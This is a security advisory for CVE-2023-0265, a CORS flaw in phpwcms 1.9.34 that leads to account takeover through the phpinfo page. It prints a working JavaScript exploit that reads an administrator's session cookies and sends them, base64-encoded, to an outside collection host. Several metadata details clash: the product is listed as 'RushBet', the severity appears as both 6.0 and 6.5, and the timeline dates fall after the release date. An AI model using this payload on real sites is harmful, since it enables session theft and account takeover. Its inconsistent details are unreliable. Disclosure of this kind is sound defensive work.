---
slug: advisories/supply/
title: phpwcms 1.9.34 - CORS leads to Account Takeover
authors: Carlos Bello
writer: cbello
codename: supply
product: phpwcms 1.9.34
date: 2023-01-10 09:00 COT
cveid: CVE-2023-0265
severity: 6.0
description: phpwcms 1.9.34    -    CORS leads to Account Takeover
keywords: Fluid Attacks, Security, Vulnerabilities, Phpwcms, CORS
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | phpwcms 1.9.34 - CORS leads to Account Takeover                    |
| **Code name**         | [Supply](https://en.wikipedia.org/wiki/Air_Supply)                 |
| **Product**           | RushBet                                                            |
| **Affected versions** | Version 1.9.34                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-01-10                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Insecure or unset HTTP headers - CORS                                                                                       |
| **Rule**              | [134. Insecure or unset HTTP headers - CORS](https://docs.fluidattacks.com/criteria/vulnerabilities/134)                    |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N                                                                                |
| **CVSSv3 Base Score** | 6.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0265](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0265)                                               |

## Description

Phpwcms version 1.9.34 allows a remote attacker to steal customer
accounts by using a malicious the administrator's session cookie
through the phpinfo page. This is possible because the application
is vulnerable to CORS.

## Vulnerability

The application allows an administrator to view the information
available on the phpinfo page.

![phpinfo-admin](https://user-images.githubusercontent.com/51862990/212206747-a60ce362-4451-45ef-b3bf-0c46eb20d2b2.png)

![phpinfo-page](https://user-images.githubusercontent.com/51862990/212196963-79f14938-45eb-4f18-838c-8d63ee67f365.png)

The problem arises when after several attempts it is discovered
that the page is vulnerable to CORS.

![cors-attemp-1](https://user-images.githubusercontent.com/51862990/212196063-ea8c284e-49a5-4176-8f36-59835c3e1d77.png)

![cors-attemp-2](https://user-images.githubusercontent.com/51862990/212196579-8c694ca9-1921-429d-9937-f302c63bec3a.png)

![cors-attemp-3](https://user-images.githubusercontent.com/51862990/212196624-b219ec90-5982-4ed2-9307-bcb4e86c8528.png)

## Exploitation

To exploit this vulnerability, we must send malicious JS code to
the administrator to send their leaked session cookies through
the phpinfo page to our malicious server.

### Exploit.html

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET','https://retr02332.com/phpwcms/include/inc_act/act_phpinfo.php',true);
    req.setRequestHeader("X-Forwarded-Host", "cf0a73a92d3h9e6btrkgrrw55meurtb7b.oast.online");
    req.withCredentials = true;
    req.send();

    function reqListener() {
        let leak = this.responseText;
        const startString = '<tr><td class="e">HTTP_COOKIE </td><td class="v">';
        const endString = '</td></tr>';

        const startIndex = leak.indexOf(startString) + startString.length;
        const endIndex = leak.indexOf(endString, startIndex);

        const cookies = leak.substring(startIndex, endIndex);
        const encodedCookies = btoa(cookies);

        location='https://cf0a73a92d3h9e6btrkgrrw55meurtb7b.oast.online/phpinfo?leak='+encodedCookies;
    };
</script>
```

## Evidence of exploitation

![explotation-cors](https://user-images.githubusercontent.com/51862990/212198407-9d234504-1d21-4bb4-8805-84b968f3b64c.gif)

![steal-session-cookie](https://user-images.githubusercontent.com/51862990/212198509-08150e9d-e234-41f6-8976-f311458410f5.png)

![account-takeover-success](https://user-images.githubusercontent.com/51862990/212206133-dc21429e-cd1f-4cc1-a838-f751c42059ef.png)

## Our security policy

We have reserved the CVE-2023-0265 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: phpwcms 1.9.34

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/slackero/phpwcms>

## Timeline

<time-lapse
  discovered="2023-12-01"
  contacted="2023-12-01"
  replied="2023-12-01"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
